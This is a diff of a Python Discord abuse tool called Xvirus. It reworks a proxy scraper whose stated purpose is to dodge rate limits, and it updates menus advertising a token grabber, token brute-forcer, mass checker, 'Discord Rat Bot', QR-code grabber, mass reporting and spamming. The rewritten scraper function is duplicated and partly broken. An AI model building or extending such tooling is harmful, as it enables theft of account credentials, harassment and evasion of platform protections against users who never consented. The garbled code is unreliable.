@@ -37,7 +37,11 @@ def CHANGE_LOG():
     3. Discord server link gen
     4. Manually update option
     5. Fixed reqs for setup.bat
-    6. DmClearer fixed''')
+    6. DmClearer fixed
+    7. Fixed many grammer stuff
+    8. Token mass checker fixed
+    9. Better Token grabber
+   10.''')
     
 THIS_VERSION = "1.6.1"
 TARGET_VERSION = 0
@@ -434,56 +438,91 @@ def fetch_proxies(url, custom_regex, proxies_log):
         proxies_log.append(f"{proxy[0]}:{proxy[1]}")
 
 
-def proxy_scrape():
-    temp_path = os.path.join(os.getenv("temp"), "xvirus_proxies")
-
-    if os.path.isfile(temp_path) and os.stat(temp_path).st_size > 0:
-        return
-
-    proxies_log = []
+def proxy_scrape(): 
+    proxieslog = []
     setTitle("Scraping Proxies")
-    start_time = time.time()
+    #start timer
+    startTime = time.time()
+    #create temp dir
+    temp = os.getenv("temp")+"\\xvirus_proxies"
+    print(f"{Fore.YELLOW}Please wait while Xvirus Scrapes proxies for you!{Fore.RESET}")
 
-    while True:
-        print(f"{Fore.BLUE}Please Wait While Xvirus Scrapes Proxies For You")
-        proxy_sources = [
-            ["http://spys.me/proxy.txt","%ip%:%port% "],
-            ["http://www.httptunnel.ge/ProxyListForFree.aspx"," target=\"_new\">%ip%:%port%</a>"],
-            ["https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.json", "\"ip\":\"%ip%\",\"port\":\"%port%\","],
-            ["https://raw.githubusercontent.com/fate0/proxylist/master/proxy.list", '"host": "%ip%".*?"country": "(.*?){2}",.*?"port": %port%'],
-            ["https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list.txt", '%ip%:%port% (.*?){2}-.-S \\+'],
-            ["https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt", '%ip%", "type": "http", "port": %port%'],
-            ["https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt", "%ip%:%port%"],
-            ["https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt", "%ip%:%port%"],
-            ["https://proxylist.icu/proxy/", "<td>%ip%:%port%</td><td>http<"],
-            ["https://proxylist.icu/proxy/1", "<td>%ip%:%port%</td><td>http<"],
-            ["https://proxylist.icu/proxy/2", "<td>%ip%:%port%</td><td>http<"],
-            ["https://proxylist.icu/proxy/3", "<td>%ip%:%port%</td><td>http<"],
-            ["https://proxylist.icu/proxy/4", "<td>%ip%:%port%</td><td>http<"],
-            ["https://proxylist.icu/proxy/5", "<td>%ip%:%port%</td><td>http<"],
-            ["https://raw.githubusercontent.com/scidam/proxy-list/master/proxy.json", '"ip": "%ip%",\n.*?"port": "%port%",']
-        ]
+    def fetchProxies(url, custom_regex):
+        global proxylist
+        try:
+            proxylist = requests.get(url, timeout=5).text
+        except Exception:
+            pass
+        finally:
+            proxylist = proxylist.replace('null', '')
+        #get the proxies from all the sites with the custom regex
+        custom_regex = custom_regex.replace('%ip%', '([0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3})')
+        custom_regex = custom_regex.replace('%port%', '([0-9]{1,5})')
+        for proxy in re.findall(re.compile(custom_regex), proxylist):
+            proxieslog.append(f"{proxy[0]}:{proxy[1]}")
 
-        threads = []
-        for url, custom_regex in proxy_sources:
-            t = threading.Thread(target=fetch_proxies, args=(url, custom_regex, proxies_log))
-            threads.append(t)
-            t.start()
+    #all urls
+def proxy_scrape(): 
+    proxieslog = []
+    setTitle("Scraping Proxies")
+    #start timer
+    startTime = time.time()
+    #create temp dir
+    temp = os.getenv("temp")+"\\xvirus_proxies"
+    Anime.Fade((logo), Colors.rainbow, Colorate.Vertical, time=5)
 
-        for t in threads:
-            t.join()
+    def fetchProxies(url, custom_regex):
+        global proxylist
+        try:
+            proxylist = requests.get(url, timeout=5).text
+        except Exception:
+            pass
+        finally:
+            proxylist = proxylist.replace('null', '')
+        #get the proxies from all the sites with the custom regex
+        custom_regex = custom_regex.replace('%ip%', '([0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3})')
+        custom_regex = custom_regex.replace('%port%', '([0-9]{1,5})')
+        for proxy in re.findall(re.compile(custom_regex), proxylist):
+            proxieslog.append(f"{proxy[0]}:{proxy[1]}")
 
-        unique_proxies = list(set(proxies_log))
-        with open(temp_path, "w") as f:
-            for proxy in unique_proxies:
-                for _ in range(random.randint(7, 10)):
-                    f.write(f"{proxy}\n")
+    #all urls
 
-        execution_time = (time.time() - start_time)
-        if len(unique_proxies) > 0:
-            break
+    proxysources = [
+        ["http://spys.me/proxy.txt","%ip%:%port% "],
+        ["http://www.httptunnel.ge/ProxyListForFree.aspx"," target=\"_new\">%ip%:%port%</a>"],
+        ["https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.json", "\"ip\":\"%ip%\",\"port\":\"%port%\","],
+        ["https://raw.githubusercontent.com/fate0/proxylist/master/proxy.list", '"host": "%ip%".*?"country": "(.*?){2}",.*?"port": %port%'],
+        ["https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list.txt", '%ip%:%port% (.*?){2}-.-S \\+'],
+        ["https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt", '%ip%", "type": "http", "port": %port%'],
+        ["https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt", "%ip%:%port%"],
+        ["https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt", "%ip%:%port%"],
+        ["https://proxylist.icu/proxy/", "<td>%ip%:%port%</td><td>http<"],
+        ["https://proxylist.icu/proxy/1", "<td>%ip%:%port%</td><td>http<"],
+        ["https://proxylist.icu/proxy/2", "<td>%ip%:%port%</td><td>http<"],
+        ["https://proxylist.icu/proxy/3", "<td>%ip%:%port%</td><td>http<"],
+        ["https://proxylist.icu/proxy/4", "<td>%ip%:%port%</td><td>http<"],
+        ["https://proxylist.icu/proxy/5", "<td>%ip%:%port%</td><td>http<"],
+        ["https://raw.githubusercontent.com/scidam/proxy-list/master/proxy.json", '"ip": "%ip%",\n.*?"port": "%port%",']
+    ]
+ 
+    threads = [] 
+    for url in proxysources:
+        #send them out in threads
+        t = threading.Thread(target=fetchProxies, args=(url[0], url[1]))
+        threads.append(t)
+        t.start()
+    for t in threads:
+        t.join()
 
-    print(f"{Fore.GREEN}Done! Scraped{Fore.MAGENTA}{len(unique_proxies): >5}{Fore.GREEN} in total => {Fore.RED}{temp_path}{Fore.RESET} | {execution_time}ms")
+    proxies = list(set(proxieslog))
+    with open(temp, "w") as f:
+        for proxy in proxies:
+            #create the same proxy 7-10 times to avoid ratelimit when using other options
+            for i in range(random.randint(7, 10)):
+                f.write(f"{proxy}\n")
+    #get the time it took to scrape
+    execution_time = (time.time() - startTime)
+    print(f"{Fore.BLUE}Done! Scraped{Fore.MAGENTA}{len(proxies): >5}{Fore.RED} in total => {Fore.RED}{temp}{Fore.RESET} | {execution_time}ms")
     setTitle(f"Xvirus {THIS_VERSION}")
 
 def proxy():
@@ -690,14 +729,14 @@ def banner(theme=None):
 > [?] {THIS_VERSION} Changelog                                                                                     Update [UPD] <
 > [!] Settings                                                                                          Xside gpt [ai] <
 {Fore.WHITE} ┌─────────────────────────────────────┬────────────────────────────────────────┬─────────────────────────────────────┐
-{Fore.WHITE} │  {Fore.RED}[{Fore.RED}01{Fore.RED}]{Fore.LIGHTBLACK_EX} Nuke Account                 {Fore.WHITE} │  {Fore.RED}[{Fore.RED}01{Fore.RED}]{Fore.LIGHTBLACK_EX} Block Friends                    {Fore.WHITE}│  {Fore.RED}[{Fore.RED}01{Fore.RED}]{Fore.LIGHTBLACK_EX} Token Disabler                {Fore.WHITE}│
+{Fore.WHITE} │  {Fore.RED}[{Fore.RED}01{Fore.RED}]{Fore.LIGHTBLACK_EX} Nuke Account                 {Fore.WHITE} │  {Fore.RED}[{Fore.RED}01{Fore.RED}]{Fore.LIGHTBLACK_EX} Block Friends                    {Fore.WHITE}│  {Fore.RED}[{Fore.RED}01{Fore.RED}]{Fore.LIGHTBLACK_EX} Token Disabler (WIP)          {Fore.WHITE}│
 {Fore.WHITE} │  {Fore.RED}[{Fore.RED}01{Fore.RED}]{Fore.LIGHTBLACK_EX} Unfriend all friends         {Fore.WHITE} │  {Fore.RED}[{Fore.RED}01{Fore.RED}]{Fore.LIGHTBLACK_EX} Profile Changer                  {Fore.WHITE}│  {Fore.RED}[{Fore.RED}01{Fore.RED}]{Fore.LIGHTBLACK_EX} Discord Rat Bot               {Fore.WHITE}│
 {Fore.WHITE} │  {Fore.RED}[{Fore.RED}01{Fore.RED}]{Fore.LIGHTBLACK_EX} Delete and leave all servers {Fore.WHITE} │  {Fore.RED}[{Fore.RED}01{Fore.RED}]{Fore.LIGHTBLACK_EX} Token Brute-Force                {Fore.WHITE}│  {Fore.RED}[{Fore.RED}01{Fore.RED}]{Fore.LIGHTBLACK_EX} Vanity Sniper                 {Fore.WHITE}│
 {Fore.WHITE} │  {Fore.RED}[{Fore.RED}01{Fore.RED}]{Fore.LIGHTBLACK_EX} Spam Create New servers      {Fore.WHITE} │  {Fore.RED}[{Fore.RED}01{Fore.RED}]{Fore.LIGHTBLACK_EX} Token Grabber                    {Fore.WHITE}│  {Fore.RED}[{Fore.RED}01{Fore.RED}]{Fore.LIGHTBLACK_EX} Dm Clearer                    {Fore.WHITE}│
 {Fore.WHITE} │  {Fore.RED}[{Fore.RED}01{Fore.RED}]{Fore.LIGHTBLACK_EX} Dm Deleter                   {Fore.WHITE} │  {Fore.RED}[{Fore.RED}01{Fore.RED}]{Fore.LIGHTBLACK_EX} QR Code grabber                  {Fore.WHITE}│  {Fore.RED}[{Fore.RED}01{Fore.RED}]{Fore.LIGHTBLACK_EX} Nitro Generator               {Fore.WHITE}│
 {Fore.WHITE} │  {Fore.RED}[{Fore.RED}01{Fore.RED}]{Fore.LIGHTBLACK_EX} Mass Dm                      {Fore.WHITE} │  {Fore.RED}[{Fore.RED}01{Fore.RED}]{Fore.LIGHTBLACK_EX} Mass Report                      {Fore.WHITE}│  {Fore.RED}[{Fore.RED}01{Fore.RED}]{Fore.LIGHTBLACK_EX} Server Link Generator         {Fore.WHITE}│
 {Fore.WHITE} │  {Fore.RED}[{Fore.RED}01{Fore.RED}]{Fore.LIGHTBLACK_EX} Enable Seizure Mode          {Fore.WHITE} │  {Fore.RED}[{Fore.RED}01{Fore.RED}]{Fore.LIGHTBLACK_EX} GroupChat Spammer                {Fore.WHITE}│  {Fore.RED}[{Fore.RED}01{Fore.RED}]{Fore.LIGHTBLACK_EX} [Coming Soon]                 {Fore.WHITE}│
-{Fore.WHITE} │  {Fore.RED}[{Fore.RED}01{Fore.RED}]{Fore.LIGHTBLACK_EX} Token Info                   {Fore.WHITE} │  {Fore.RED}[{Fore.RED}01{Fore.RED}]{Fore.LIGHTBLACK_EX} Webhook Destroyer                {Fore.WHITE}│  {Fore.RED}[{Fore.RED}01{Fore.RED}]{Fore.LIGHTBLACK_EX} [Coming Soon]                 {Fore.WHITE}│
+{Fore.WHITE} │  {Fore.RED}[{Fore.RED}01{Fore.RED}]{Fore.LIGHTBLACK_EX} Token Info (WIP)             {Fore.WHITE} │  {Fore.RED}[{Fore.RED}01{Fore.RED}]{Fore.LIGHTBLACK_EX} Webhook Destroyer                {Fore.WHITE}│  {Fore.RED}[{Fore.RED}01{Fore.RED}]{Fore.LIGHTBLACK_EX} [Coming Soon]                 {Fore.WHITE}│
 {Fore.WHITE} │  {Fore.RED}[{Fore.RED}01{Fore.RED}]{Fore.LIGHTBLACK_EX} Log into an account          {Fore.WHITE} │  {Fore.RED}[{Fore.RED}01{Fore.RED}]{Fore.LIGHTBLACK_EX} Token Mass Checker               {Fore.WHITE}│  {Fore.RED}[{Fore.RED}01{Fore.RED}]{Fore.LIGHTBLACK_EX} [Coming Soon]                 {Fore.WHITE}│
 {Fore.WHITE} └─────────────────────────────────────┴────────────────────────────────────────┴─────────────────────────────────────┘
 Welcome {username}!''')
@@ -720,14 +759,14 @@ bannerTheme = f"""
 > [?] {THIS_VERSION} Changelog                                                                                     Update [UPD] <
 > [!] Settings                                                                                          Xside gpt [ai] <
  ┌─────────────────────────────────────┬────────────────────────────────────────┬─────────────────────────────────────┐
- │  [01] Nuke Account                  │  [10] Block Friends                    │  [19] Token Disabler                │
+ │  [01] Nuke Account                  │  [10] Block Friends                    │  [19] Token Disabler (WIP)          │
  │  [02] Unfriend all friends          │  [11] Profile Changer                  │  [20] Discord Rat Bot               │
  │  [03] Delete and leave all servers  │  [12] Token Brute-Force                │  [21] Vanity Sniper                 │
  │  [04] Spam Create New servers       │  [13] Token Grabber                    │  [22] Dm Clearer                    │
  │  [05] Dm Deleter                    │  [14] QR Code grabber                  │  [23] Nitro Generator               │
  │  [06] Mass Dm                       │  [15] Mass Report                      │  [24] Server Link Generator         │
  │  [07] Enable Seizure Mode           │  [16] GroupChat Spammer                │  [25] [Coming Soon]                 │
- │  [08] Token Info                    │  [17] Webhook Destroyer                │  [26] [Coming Soon]                 │
+ │  [08] Token Info (WIP)              │  [17] Webhook Destroyer                │  [26] [Coming Soon]                 │
  │  [09] Log into an account           │  [18] Token Mass Checker               │  [27] [Coming Soon]                 │
  └─────────────────────────────────────┴────────────────────────────────────────┴─────────────────────────────────────┘
 Welcome {username}!"""
@@ -748,14 +787,14 @@ def bennerTheme(type1, type2):
 > [?] {THIS_VERSION} Changelog                                                                                     Update [UPD] <
 > [!] Settings                                                                                          Xside gpt [ai] <''')+type2(f'''
  ┌─────────────────────────────────────┬────────────────────────────────────────┬─────────────────────────────────────┐
- │  [01] Nuke Account                  │  [10] Block Friends                    │  [19] Token Disabler                │
+ │  [01] Nuke Account                  │  [10] Block Friends                    │  [19] Token Disabler (WIP)          │
  │  [02] Unfriend all friends          │  [11] Profile Changer                  │  [20] Discord Rat Bot               │
  │  [03] Delete and leave all servers  │  [12] Token Brute-Force                │  [21] Vanity Sniper                 │
  │  [04] Spam Create New servers       │  [13] Token Grabber                    │  [22] Dm Clearer                    │
  │  [05] Dm Deleter                    │  [14] QR Code grabber                  │  [23] Nitro Generator               │
  │  [06] Mass Dm                       │  [15] Mass Report                      │  [24] Server Link Generator         │
  │  [07] Enable Seizure Mode           │  [16] GroupChat Spammer                │  [25] [Coming Soon]                 │
- │  [08] Token Info                    │  [17] Webhook Destroyer                │  [26] [Coming Soon]                 │
+ │  [08] Token Info (WIP)              │  [17] Webhook Destroyer                │  [26] [Coming Soon]                 │
  │  [09] Log into an account           │  [18] Token Mass Checker               │  [27] [Coming Soon]                 │
  └─────────────────────────────────────┴────────────────────────────────────────┴─────────────────────────────────────┘
 Welcome {username}!''')
